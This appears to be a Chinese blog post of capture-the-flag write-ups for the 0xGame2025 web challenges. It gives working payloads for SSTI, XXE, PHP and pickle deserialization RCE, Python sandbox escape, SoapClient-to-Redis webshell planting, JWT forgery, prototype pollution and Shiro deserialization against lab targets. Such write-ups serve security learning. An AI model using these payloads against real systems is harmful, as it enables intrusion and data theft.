---
title: 0xGame2025 web大部分WP（精简版）
description: 对于上篇0xGame2025的WP的精练，舒服了
date: 2026-05-14 22:10:13
updated: 2026-05-14 22:10:13
image: https://img.yanxisishi.top/images/2026/05/397594608509708e625583ab4097291a.jpg
categories: [CTF]
tags: [CTF, WP]
---

## Lemon

**摘要：** 本题考点是查看页面源代码，flag 直接藏在 HTML 注释里。

`ctrl + u` 看源码，注释里直接有：

```html
<!-- flag{68fa59ad-46ee-47e8-84ee-286fd0d6380c} -->
```

## Lemon_RevEnge

**摘要：** 本题考点是 Python 类污染，通过 `merge()` 递归写对象属性，污染 Flask 关键配置后读环境变量。

核心代码是这个 `merge()`：

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

`/` 路由会把 POST 的 JSON 送进 `merge(json.loads(request.data), Game0x)`，所以用户可以控制 `src`。

当传入的 key 是对象本来就有的属性，并且 value 是字典时，程序会继续递归进这个属性。因此可以从实例一路摸到：

```python
Game0x.__class__.__init__.__globals__
```

`__globals__` 是 `app.py` 的全局命名空间，里面有 `app` 和 `os`。所以 payload 前半段基本固定：

```json
{"__class__":{"__init__":{"__globals__":{}}}}
```

第一种思路是污染 Flask 的静态目录。

![image-20260507165524355](https://img.yanxisishi.top/images/2026/05/image-20260507165524355.png)

但直接改 `static_folder` 不行，换成底层属性 `_static_folder`：

```json
{"__class__":{"__init__":{"__globals__":{"app":{"_static_folder":"/"}}}}}
```

然后访问：

```http
/static/proc/1/environ
```

即可读到环境变量里的 flag。

第二种思路是污染 `os.path.pardir` 绕目录穿越检测：

```json
{"__class__":{"__init__":{"__globals__":{"os":{"path":{"pardir":"!"}}}}}}
```

污染后再访问 `../../../proc/1/environ`。

## ez_signin

**摘要：** 本题考点是签到题查看源码，flag 直接给。

查看页面源代码即可。

## Http的真理，我已解明

**摘要：** 本题考点是按提示补全 HTTP 请求的 GET、POST、Cookie、UA、Referer 和 Via 相关字段。

页面提示：

```txt
1. 用GET传递 hello=web
2. POST传递 http=good
3. 设置cookie Sean=god
4. 请使用Safari浏览器访问
5. 请从www.mihoyo.com访问本页面
6. 请使用clash这只猫猫来代理一下
```

如图依次构造请求：

![image-20260507124131431](https://img.yanxisishi.top/images/2026/05/image-20260507124131431.png)

## 留言板（粉）

**摘要：** 本题考点是弱口令进入后台后触发 XXE，通过外部实体读取 `/flag`。

访问 `/login.php`，弱密码爆破得到：

```txt
admin / admin123
```

登录后留言处输入普通文本会报 `DOMDocument::loadXML()`，说明后端在解析 XML。直接 XXE：

```xml
<!DOCTYPE xixi[<!ENTITY xxe SYSTEM "file:///flag">]>
<root>
    <yanxi>&xxe;</yanxi>
</root>
```

提交后拿到 flag。

## 404NotFound

**摘要：** 本题考点是 Flask 404 页面 SSTI，绕过黑名单后用环境变量读 flag。

访问不存在路径时，页面会把路径回显出来，而且 Wappalyzer 识别是 Flask。试一下：

```txt
/{{7*7}}
```

返回路径里出现 `49`，确认 SSTI。常规 payload 会被 WAF 拦：

```python
{{url_for.__globals__['os'].popen('cat /flag').read()}}
```

这里把 `.` 换成中括号访问，再用字符串拼接绕关键词：

```http
/{{url_for['__glo''bals__']['o''s']['po''pen']('ls /')['read']()}}
```

`cat /flag` 回显权限不足，于是改读环境变量：

```http
/{{url_for['__glo''bals__']['o''s']['po''pen']('env')['read']()}}
```

或者：

```http
/{{url_for['__glo''bals__']['o''s']['po''pen']('cat /proc/1/environ')['read']()}}
```

## RCE1

**摘要：** 本题考点是 PHP `md5()` 数组绕过加 `eval()` 过滤绕过，实现无字母数字或短 payload RCE。

源码里要求：

```php
md5($rce1) === md5($rce2) && $rce1 !== $rce2
```

+ 如果环境是 PHP 7.x，可以用数组让 md5(array) 返回 NULL，从而满足 NULL === NULL。
+ 如果是 PHP 8+，这个方法会触发 TypeError，不能直接用数组绕过。

这里 `rce1`、`rce2` 用数组绕过即可：

```txt
GET: ?rce1[]=1
POST: rce2[]=2
```

`rce3` 会进 `eval()`，但是过滤了数字、特殊字符和一堆命令关键词。可以按无字母数字 RCE 打：

```txt
GET: ?rce1[]=1
POST: rce2[]=2&rce3=(~'%8c%86%8c%8b%9a%92')(~'%9c%9e%8b%df%d0%99%93%9e%98');
```

也可以走无参数思路，把真正的命令放到请求头里：

```txt
GET: ?rce1[]=1
POST: rce2[]=2&rce3=eval(end(getallheaders()));
请求头最后面加上: yanxi: system('cat /flag');
```

或者直接用 `exec` 或反引号 + 通配符绕关键词：

```txt
GET: ?rce1[]=1
POST: rce2[]=2&rce3=print(`tac /f???`);
```

```txt
GET: ?rce1[]=1
POST: rce2[]=2&rce3=print(exec('tac /f???'));
```

甚至是：

```txt
GET: ?rce1[]=1
POST: rce2[]=2&rce3=?><?=`tac /f???`;
```

## 我只想要你的PNG

**摘要：** 本题考点是文件名命令注入，上传内容不是重点，恶意 PHP 代码塞进文件名里执行。

源码注释提示 `/check.php`，访问后看到类似 `ls /` 的结果：

```txt
bin boot dev etc home lib media sbin mnt opt proc root run srv sys tmp usr var flag
```

上传正常 `1.png` 后，再访问 `/check.php`，结果里出现了上传文件名，说明真正被拼进命令的是文件名，而不是文件内容。

想传：

```php
<?php system('cat /flag')?>.png
```

但是文件名里不能有 `/`，所以改读环境变量：

```php
<?php system('env')?>.png
```

上传后通过 `/check.php` 触发，拿到 flag。这个题的坑点就是：别一直盯上传内容，题目说“不想让你看”，其实是在暗示文件名。

## DNS想要玩

**摘要：** 本题考点是 SSRF 主机解析绕过，把 URL 的 hostname 解析成指定 IP 后触发命令执行。

关键代码：

```python
BlackList = ['localhost', '@', '172', 'gopher', 'file', 'dict', 'tcp', '0.0.0.0', '114.5.1.4']

def check(url):
    url = urlparse(url)
    host = url.hostname
    host_acscii = host.encode('idna').decode('utf-8')
    return socket.gethostbyname(host_acscii) == '114.5.1.4'
```

`raw_url` 里不能直接出现 `114.5.1.4`，但最终解析出来必须等于它。可以用十进制或十六进制 IP：

```http
/ssrf?url=http://1912930564&cmd=cat /flag
```

```http
/ssrf?url=http://0x72050104&cmd=cat /flag
```

也可以用 `nip.io` 这类通配 DNS：

```http
/ssrf?url=http://114-5-1-4.nip.io&cmd=cat /flag
```

## Rubbish_Unser

**摘要：** 本题考点是 PHP POP 链构造，以及在 PHP 8 环境下用 `NAN` 绕过 `md5/sha1` 强比较。

入口是：

```php
if (isset($_GET['0xGame'])) {
    $web = unserialize($_GET['0xGame']);
    throw new Exception("Rubbish_Unser");
}
```

终点在 `HSR::__get()`：

```php
function __get($robin)
{
    $castorice = $this -> robin;
    eval($castorice);
}
```

完整链子：

```txt
ZZZ::__destruct()
-> Mi::__toString()
-> GI::__call()
-> HI3rd::__invoke()
-> HSR::__get()
-> eval($robin)
```

`HI3rd::__invoke()` 里有：

```php
$this->kiana !== $this->RaidenMei
&& md5($this->kiana) === md5($this->RaidenMei)
&& sha1($this->kiana) === sha1($this->RaidenMei)
```

数组绕过在 PHP 8 会直接 `TypeError`，这里用 `NAN` ：`NAN !== NAN` 为真，但传进 `md5/sha1` 会转成同一个字符串。

exp：

```php
<?php
class ZZZ {
    public $yuzuha;
}

class HSR {
    public $robin = "system('env');";
}

class HI3rd {
    public $RaidenMei = NAN;
    public $kiana = NAN;
    public $guanxing;
}

class GI {
    public $furina;
}

class Mi {
    public $game;
}

$a = new ZZZ();
$a->yuzuha = new Mi();
$a->yuzuha->game = new GI();
$a->yuzuha->game->furina = new HI3rd();
$a->yuzuha->game->furina->guanxing = new HSR();
echo serialize($a);
```

得到的 payload：

```txt
O:3:"ZZZ":1:{s:6:"yuzuha";O:2:"Mi":1:{s:4:"game";O:2:"GI":1:{s:6:"furina";O:5:"HI3rd":3:{s:9:"RaidenMei";d:NAN;s:5:"kiana";d:NAN;s:8:"guanxing";O:3:"HSR":1:{s:5:"robin";s:14:"system('env');";}}}}}
```

传给 `?0xGame=` 即可。

或者利用 `Exception::__toString()` 绕过 hash。

`Exception::__toString()` 的结果与 `message`、文件名、行号、调用栈等有关，但不会把 `code` 参数算进去。所以可以构造两个 `message` 为空、创建位置相同，但是 `code` 不同的 `Exception` 对象：

```php
$a->yuzuha->game->furina->kiana=new Exception("",1);$a->yuzuha->game->furina->RaidenMei=new Exception("",2);
```

exp：

```php
<?php
class ZZZ {
    public $yuzuha;
}

class HSR {
    public $robin = "system('env');";
}

class HI3rd {
    public $RaidenMei;
    public $kiana;
    public $guanxing;
}

class GI {
    public $furina; 
}

class Mi {
    public $game;
}

$a = new ZZZ();
$a->yuzuha = new Mi();
$a->yuzuha->game = new GI();
$a->yuzuha->game->furina = new HI3rd();
$a->yuzuha->game->furina->kiana=new Exception("",1);$a->yuzuha->game->furina->RaidenMei=new Exception("",2);
$a->yuzuha->game->furina->guanxing = new HSR();
echo urlencode(serialize($a));
```

**注：** `Exception` 序列化后生成私有/保护属性名，需要 URL 编码。

得到的 payload：

```txt
O%3A3%3A%22ZZZ%22%3A1%3A%7Bs%3A6%3A%22yuzuha%22%3BO%3A2%3A%22Mi%22%3A1%3A%7Bs%3A4%3A%22game%22%3BO%3A2%3A%22GI%22%3A1%3A%7Bs%3A6%3A%22furina%22%3BO%3A5%3A%22HI3rd%22%3A3%3A%7Bs%3A9%3A%22RaidenMei%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fhome%2Fkali%2FHello_CTF%2F1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A28%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A5%3A%22kiana%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fhome%2Fkali%2FHello_CTF%2F1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A28%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A8%3A%22guanxing%22%3BO%3A3%3A%22HSR%22%3A1%3A%7Bs%3A5%3A%22robin%22%3Bs%3A14%3A%22system%28%27env%27%29%3B%22%3B%7D%7D%7D%7D%7D
```

## 马哈鱼商店

**摘要：** 本题考点是购买逻辑参数篡改进入隐藏 pickle 入口，再用 `protocol=0` 构造 pickle 反序列化 RCE。

注册登录后，直接买 Flag 会给假 flag，页面其实在暗示 pickle。真正目标是买不起的 `Pickle` 商品。购买请求里有：

```http
pid=8&discount=1
```

把折扣改小：

```http
pid=8&discount=0.00001
```

购买成功后拿到 `/shop_success`，再得到隐藏入口 `/pickle_dsa`。该入口大概逻辑是：GET 参数 `data` 先 base64 解码，再 `pickle.loads(data)`。

这里有特殊字节过滤，所以用文本协议 `protocol=0`。可以手写：

```python
csubprocess
check_output
(S'env'
tR.
```

base64 后访问：

```http
/pickle_dsa?data=Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VudicKdFIu
```

或者用 `__reduce__` 生成：

```python
import pickle
import base64

class P:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('env').read()",))

payload = pickle.dumps(P(), protocol=0)
print(base64.b64encode(payload).decode())
```

得到：

```txt
Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFZfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdlbnYnKS5yZWFkKCkKcDEKdHAyClJwMwou
```

传入后拿 flag。

## 这真的是反序列化

**摘要：** 本题考点是 PHP 原生类 `SoapClient` SSRF 配合 CRLF 注入打 Redis，写入 webshell 后 RCE。

题目类的关键点：

```php
public function reverse(){
    $this->pwn = new $this->web($this->misc, $this->crypto);
}

public function osint(){
    $this->pwn->play_0xGame();
}

public function __destruct(){
    $this->reverse();
    $this->osint();
}
```

也就是说反序列化后会动态实例化 `$this->web`，再调用 `$this->pwn->play_0xGame()`。把 `$web` 设成 `SoapClient`，就能让服务端主动请求内网地址。

题目 hint：`Redis20251206`，所以目标是本机 Redis，密码 `20251206`。`SoapClient` 的 `uri` 可插入 `\r\n`，借 CRLF 把 Redis 命令塞进 HTTP 请求里。

exp：

```php
<?php
class pure {
    public $web = "SoapClient";
    public $misc = null;
    public $crypto;
    public $pwn;
}

$a = new pure();
$cmd =
    "AUTH 20251206\r\n" .
    "CONFIG SET dir /var/www/html/\r\n" .
    "CONFIG SET dbfilename shell.php\r\n" .
    "SET x \"<?php @eval(\$_POST[1]); ?>\"\r\n" .
    "SAVE\r\n";

$a->crypto = array(
    "location" => "http://127.0.0.1:6379/",
    "uri" => "hello\"\r\n" . $cmd . "\r\nhello"
);

echo urlencode(serialize($a));
```

注意编写脚本的时候小心 payload 中不要出现换行。

得到：

```txt
O%3A4%3A%22pure%22%3A4%3A%7Bs%3A3%3A%22web%22%3Bs%3A10%3A%22SoapClient%22%3Bs%3A4%3A%22misc%22%3BN%3Bs%3A6%3A%22crypto%22%3Ba%3A2%3A%7Bs%3A8%3A%22location%22%3Bs%3A22%3A%22http%3A%2F%2F127.0.0.1%3A6379%2F%22%3Bs%3A3%3A%22uri%22%3Bs%3A136%3A%22hello%22%0D%0AAUTH+20251206%0D%0ACONFIG+SET+dir+%2Fvar%2Fwww%2Fhtml%2F%0D%0ACONFIG+SET+dbfilename+shell.php%0D%0ASET+x+%22%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3B+%3F%3E%22%0D%0ASAVE%0D%0A%0D%0Ahello%22%3B%7Ds%3A3%3A%22pwn%22%3BN%3B%7D 
```

传给 `?ai=` 后访问 `/shell.php`：

```http
1=system('env');
```

拿到 flag。

## Plus_plus

**摘要：** 本题考点是 PHP 字符自增绕过黑名单，构造 `$_POST` 后调用任意函数执行命令。

源码里 `?0xGame` 可以看代码，`web` 参数长度不超过 120，且过滤了大部分字母和符号，但没有挡住 PHP 字符串自增。

payload：

```http
web=$C=H;$C++;$C++;$C++;$C++;$C++;$C++;$C++;$_=$C;$C++;$H=_.$C.$_;$C++;$C++;$C++;$H.=$C;$C++;$H.=$C;$$H[_]($$H[__]);
```

这段会通过 `H -> O -> P -> S -> T` 拼出 `_POST`，最后执行：

```php
$_POST['_']($_POST['__']);
```

实际请求记得 URL 编码，并补参数：

```http
web=%24C%3DH%3B%24C%2B%2B%3B%24C%2B%2B%3B%24C%2B%2B%3B%24C%2B%2B%3B%24C%2B%2B%3B%24C%2B%2B%3B%24C%2B%2B%3B%24_%3D%24C%3B%24C%2B%2B%3B%24H%3D_.%24C.%24_%3B%24C%2B%2B%3B%24C%2B%2B%3B%24C%2B%2B%3B%24H.%3D%24C%3B%24C%2B%2B%3B%24H.%3D%24C%3B%24%24H%5B_%5D(%24%24H%5B__%5D)%3B&_=system&__=env
```

## 你好，爪洼脚本

**摘要：** 本题考点是浏览器控制台执行 JS，输出内容就是 flag。

打开 F12，把页面里的 JS 复制到控制台执行，输出：

```txt
Hello, JavaScript
```

所以 flag 是：

```txt
flag{Hello, JavaScript}
```

## 放开我的变量

**摘要：** 本题考点是 PHP `eval` 拿命令执行后，通过 root 定时脚本的 `cp` 参数注入和软链接读取 `/flag`。

扫到 `/robots.txt`，找到 `/asdback.php`：

```php
$cmd = $_POST['__0xGame2025phpPsAux'];
eval($cmd);
```

先试：

```http
__0xGame2025phpPsAux=system('env');
```

能拿 flag，但这是非预期，假装一下不知道。

`cat /flag` 没回显，`ls / -la` 发现 `/flag` 是 root 私有权限。枚举进程：

```http
__0xGame2025phpPsAux=system('ps -eo pid,ppid,user,cmd');
```

看到 root 跑着 `/start.sh`，读取它：

```http
__0xGame2025phpPsAux=system('cat /start.sh');
```

关键逻辑：

```sh
cd /var/www/html/primary
while :
do
    cp -P * /var/www/html/marstream/
    chmod 755 -R /var/www/html/marstream/
    sleep 5s
done &
```

`primary` 可写，`cp -P *` 又会展开文件名。如果创建一个名为 `-L` 的文件，root 执行时就变成：

```sh
cp -P -L flag111 /var/www/html/marstream/
```

后面的 `-L` 覆盖 `-P`，会跟随软链接。于是放一个指向 `/flag` 的软链接：

```http
__0xGame2025phpPsAux=system('touch /var/www/html/primary/-L;ln -s /flag /var/www/html/primary/flag111');
```

等 root 脚本复制后，访问：

```http
/marstream/flag111
```

拿到 flag。

## 文件查询器（蓝）

**摘要：** 本题考点是 `file_get_contents()` 配合 `phar://` 触发 PHAR metadata 反序列化，并绕过上传检测。

非预期是直接查：

```txt
../../../../proc/self/environ
```

环境变量 base64 解码后就有 flag。咳咳，继续看预期。

查询 `./index.php`，base64 解码后看到 `MaHaYu`：

```php
public function __destruct()
{
    $HG2 = $this -> HG2;
    $FM2tM = $this -> FM2tM;
    echo "Wow";
    var_dump($HG2($FM2tM));
}
```

目标就是让：

```php
$HG2 = "system";
$FM2tM = "env";
```

源码里没有 `unserialize()`，但有：

```php
file_get_contents($file)
```

所以用 `phar://`。旧版本 PHP 在解析 PHAR 时会反序列化 metadata，刚好触发 `__destruct()`。

生成 PHAR：

```php
<?php
class MaHaYu{
    public $HG2;
    public $ToT;
    public $FM2tM;
}

$file = new Phar("shell.phar");
$file->startBuffering();
$file->setStub("<?php __HALT_COMPILER();?>");
$file->addFromString("a", "aaa");

$a = new MaHaYu();
$a->HG2 = "system";
$a->FM2tM = "env";
$file->setMetadata($a);

$file->stopBuffering();
```

本地执行：

```bash
php -d phar.readonly=0 exp.php
```

上传处只允许 `jpg/png/pdf`，并且内容里不能出现 `__HALT_COMPILER();`。后缀好绕，内容检测用 gzip 压一下：

```bash
gzip -c shell.phar > shell.jpg
```

上传后触发：

```txt
phar://./upload/shell.jpg/a
```

拿到 flag。

## 消栈逃出沙箱(1)反正不会有2

**摘要：** 本题考点是 Python 沙箱逃逸，通过白名单对象或异常栈帧找回完整 `builtins` 执行命令。

源码把用户输入丢进：

```python
exec(code, safe_globals)
```

但只给了几个内置对象：

```python
whitelist = {
    "print": print,
    "list": list,
    "len": len,
    "Exception": Exception
}
```

这类沙箱的核心是：白名单对象本身也是对象，能继续找属性。最简单的突破口是 `print.__self__`，它指向真正的 `builtins` 模块：

```http
data=print(print.__self__.__import__('os').popen('env').read())
```

也可以按题名走“消栈”思路，用异常拿 traceback，再通过 `f_back.f_globals` 回到外层真实全局命名空间：

```python
try:
    raise Exception()
except Exception as e:
   print(e.__traceback__.tb_frame.f_back.f_globals["__builtins__"].__import__("os").popen("env").read())
```

URL 编码后传：

```http
data=try%3A%0A%20%20%20%20raise%20Exception%28%29%0Aexcept%20Exception%20as%20e%3A%0A%09print%28e.__traceback__.tb_frame.f_back.f_globals%5B%22__builtins__%22%5D.__import__%28%22os%22%29.popen%28%22env%22%29.read%28%29%29
```

Typhon 也能直接跑出 payload，例如：

```python
def run():
    blackchar = "&*^%#${}@!~`·/<>"

    whitelist = {
        "print": print,
        "list": list,
        "len": len,
        "Exception": Exception,
    }

    safe_globals = {
        "__builtins__": whitelist
    }

    import Typhon
    Typhon.bypassRCE(
        "env",
        banned_chr=list(blackchar),
        local_scope=safe_globals,
        max_length=160,
        interactive=False,
        print_all_payload=True,
        log_level='INFO'
    )

run()
```

这里几个参数的意思是：

```txt
"env"：希望最终执行的命令。
banned_chr：题目过滤的字符。
local_scope：题目 exec 使用的受限命名空间。
max_length：payload 的最大长度。
interactive=False：不要生成依赖交互输入的 payload。
print_all_payload=True：把找到的 payload 都打印出来。
```

运行后得到很多 payload：

![image-20260510193627581](https://img.yanxisishi.top/images/2026/05/image-20260510193627581.png)

比如用：

```python
().__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').popen('env').read()
```

只需加上 `print()` 打印出来即可，所以访问 `/check` 并 POST 传入：

```http
data=print(().__class__.__mro__[1].__reduce_ex__(0,3)[0].__globals__['__builtins__']['__import__']('os').popen('env').read())
```

## New_Python!

**摘要：** 本题考点是 RSA 泄露 `dp` 分解 `n`，再组合 UUID8 三段信息得到 admin 密码。

题目提示说：RSA 得到 UUID8 的 `a`，其他地方拿 `b`、`c`。已知：

```python
n = 70344167219256641077015681726175134324347409741986009928113598100362695146547483021742911911881332309275659863078832761045042823636229782816039860868563175749260312507232007275946916555010462274785038287453018987580884428552114829140882189696169602312709864197412361513311118276271612877327121417747032321669
e = 65537
c = 46438476995877817061860549084792516229286132953841383864271033400374396017718505278667756258503428019889368513314109836605031422649754190773470318412332047150470875693763518916764328434140082530139401124926799409477932108170076168944637643580876877676651255205279556301210161528733538087258784874540235939719
dp = 7212869844215564350030576693954276239751974697740662343345514791420899401108360910803206021737482916742149428589628162245619106768944096550185450070752523
```

因为 `dp = d mod (p-1)`，所以 `e * dp - 1` 是 `p-1` 的倍数，枚举 `k` 即可找 `p`：

```python
x = e * dp - 1
p = next(x // k + 1 for k in range(1, e) if x % k == 0 and n % (x // k + 1) == 0)
q = n // p
d = pow(e, -1, (p - 1) * (q - 1))
m = pow(c, d, n)
s = m.to_bytes((m.bit_length() + 7) // 8, "big")

if s.startswith(b"key{") and s.endswith(b"}"):
    m = int.from_bytes(s[4:-1], "big")

print(m)
```

得到 `a`：

```txt
183915192278352122275137263475187826728085592578452428749304943
```

响应头里有：

```http
X-Frame-Options: b = 120604030108
```

扫目录 `/auth` 得到：

```json
{"c":"7430469441","token":"Token is Useless, But You Can Catch This Page!"}
```

组合 UUID8：

```python
from uuid import UUID

a = 183915192278352122275137263475187826728085592578452428749304943
b = 120604030108
c = 7430469441

uid = UUID(int=
    ((a & ((1 << 48) - 1)) << 80) |
    (8 << 76) |
    ((b & ((1 << 12) - 1)) << 64) |
    (2 << 62) |
    (c & ((1 << 62) - 1))
)

print(uid)
```

得到：

```txt
63727970-746f-849c-8000-0001bae3f741
```

用 `admin/63727970-746f-849c-8000-0001bae3f741` 登录，后台直接 `env` 拿 flag。

## 这真的是文件上传

**摘要：** 本题考点是 Node.js 任意文件写入，利用 `path.join()` 规范化绕过 `js$` 过滤并覆盖 EJS 模板 RCE。

关键源码：

```js
app.use((req, res, next) => {
    if (/js$|\.\./i.test(req.path)) res.status(403).send('Denied filename');
    else next();
})

app.use((req, res, next) => {
    if (req.path.endsWith('/')) serveIndex(req, res);
    else next();
})

app.put('/*', (req, res) => {
    const filePath = path.join(STATIC_DIR, req.path);
    fs.writeFile(filePath, Buffer.from(req.body.content, 'base64'), ...);
});
```

`PUT` 可以写文件，目标是覆盖 `views/index.ejs`。直接：

```http
PUT /views/index.ejs
```

会被 `js$` 拦。绕法是：

```http
PUT /views/index.ejs/.
```

因为它不以 `js` 结尾，且 `path.join()` 会把这个路径规范化成真正的 `views/index.ejs`。

写入 EJS 命令执行模板：

```ejs
<%- process.mainModule.require('child_process').execSync('env').toString() %>
```

base64 后：

```json
{"content":"PCUtIHByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2VudicpLnRvU3RyaW5nKCkgJT4="}
```

![image-20260510015824446](https://img.yanxisishi.top/images/2026/05/image-20260510015824446.png)

请求成功后访问 `/`，触发 `res.render('index')`，恶意 EJS 被渲染，执行 `env` 拿 flag。这里一开始试 `cat /flag` 会提示没有 `/flag`，所以改环境变量。

## 长夜月

**摘要：** 本题考点是 JWT 只 `decode` 不 `verify` 导致伪造 admin，再利用 `merge()` 做 JS 原型链污染触发 flag 条件。

管理员校验里用了：

```js
const data = jwt.decode(token);
if (data.username === 'admin') {
    return next();
}
```

`jwt.decode()` 只解 payload，不校验签名，所以可以自己伪造 token：

```json
{"username":"admin","password":"1"}
```

token：

```txt
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIn0.
```

带上：

```http
Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIn0.
```

进入 `/admin_club1st` 后，核心逻辑：

```js
let evernight = Object.create(CONFIG);
merge(evernight, body);
let en = Object.create(CONFIG);

if (en.min_public_time < "2025-08-03") {
    return res.render('march7th', {message: FLAG});
}
```

`evernight` 和 `en` 的原型都指向 `CONFIG`，而 `merge()` 没防 `__proto__`：

```js
function merge(dst, src) {
    if (typeof dst !== "object" || typeof src !== "object") return dst;
    for (let key in src) {
        if (key in src && key in dst) {
            merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
}
```

污染 `CONFIG.min_public_time`：

```http
POST /admin_club1st
Cookie: token=伪造admin token
Content-Type: application/json

{"__proto__":{"min_public_time":"2025-08-02"}}
```

`"2025-08-02" < "2025-08-03"` 成立，于是渲染 flag。

## 绳网委托Bottle版

**摘要：** 本题考点是 Bottle SimpleTemplate 注入，绕过 `{}` 过滤后用行首 `%` 执行 Python 代码。

留言会回显，`{{7*7}}` 被 WAF 处理，`{}` 会被删，`< >` 会转义。Bottle 的 STPL 不止支持 `{{...}}`，还支持行首 `%` 执行 Python 语句。

第一次直接输：

```python
% _printlist([__import__('os').popen('cat /flag').read()])
```

![image-20260512224628305](https://img.yanxisishi.top/images/2026/05/image-20260512224628305.png)

原样显示，是因为评论内容被包在 HTML 标签里，`%` 不在模板行首。解决方法是前后加换行，让 `%` 真正顶到模板源码行首：

```python
111
% _printlist([__import__('os').popen('cat /flag').read()])
222
```

也可以用 `abort` 回显：

```python
111
% import bottle
% a = __import__('os').popen('cat /flag').read()
% bottle.abort(404, a)
% end
222
```

这里的重点是 STPL 和 Jinja2 不一样，STPL 更接近直接在模板里写 Python。

## SpringShiro

**摘要：** 本题考点是 Spring Boot + Shiro 审计，开放 Actuator 泄露 heapdump，从中提取 rememberMe AES-GCM key 后打 Shiro 反序列化。

附件是 Spring Boot 打包项目，先看重点目录：

```txt
BOOT-INF/classes   作者代码和配置
BOOT-INF/lib       项目依赖
Dockerfile         容器和权限
readflag.go        最终读 flag 方式
```

用 jadx 反编译 `SpringShiro.jar` 后，重点看三个文件：

```txt
IndexController.java
ShiroConfig.java
MyRealm.java
```

`IndexController.java` 只有 `/` 和 `/login`，没啥危险点。`MyRealm.java` 直接写了账号密码：

```java
if (username.equals("admin") && password.equals("123456")) {
    return new SimpleAuthenticationInfo(username, password, getName());
}
```

所以先登录：

```txt
admin / 123456
```

`ShiroConfig.java` 里有：

```java
@Bean
public RememberMeManager rememberMeManager() {
    return new CookieRememberMeManager();
}
```

说明启用了 Shiro rememberMe。配置文件还有：

```properties
management.endpoints.web.exposure.include=*
```

登录后访问 `/actuator`，重点端点有：

```txt
/actuator/env
/actuator/heapdump
```

`/actuator/env` 可以直接拿 flag，算非预期。预期继续下载 `/actuator/heapdump`，用 JDumpSpider 提取 Shiro key：

```bash
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
```

结果：

```txt
CookieRememberMeManager(ShiroKey)
algMode = GCM, key = lewXTrPKeO1lIkIMeg4GvA==, algName = AES
```

依赖里有：

```txt
commons-beanutils-1.9.4.jar
commons-collections-3.2.2.jar
```

可以走 `CommonsBeanutils1`。再看 `Dockerfile`：

```dockerfile
chmod 400 /flag
chmod 4755 /readflag
USER app
```

程序以 `app` 跑，不能直接 `cat /flag`，要执行 SUID 程序：

```bash
/readflag
```

最后用 [ShiroAttack2](https://github.com/SummerSec/ShiroAttack2)，Java 8 启动，配置：

```txt
目标地址：http://靶机/login
关键字：rememberMe
指定密钥：lewXTrPKeO1lIkIMeg4GvA==
AES GCM：勾选
利用链：CommonsBeanutils1
回显方式：TomcatEcho / AllEcho
命令：/readflag
```

![image-20260513235837647](https://img.yanxisishi.top/images/2026/05/image-20260513235837647.png)
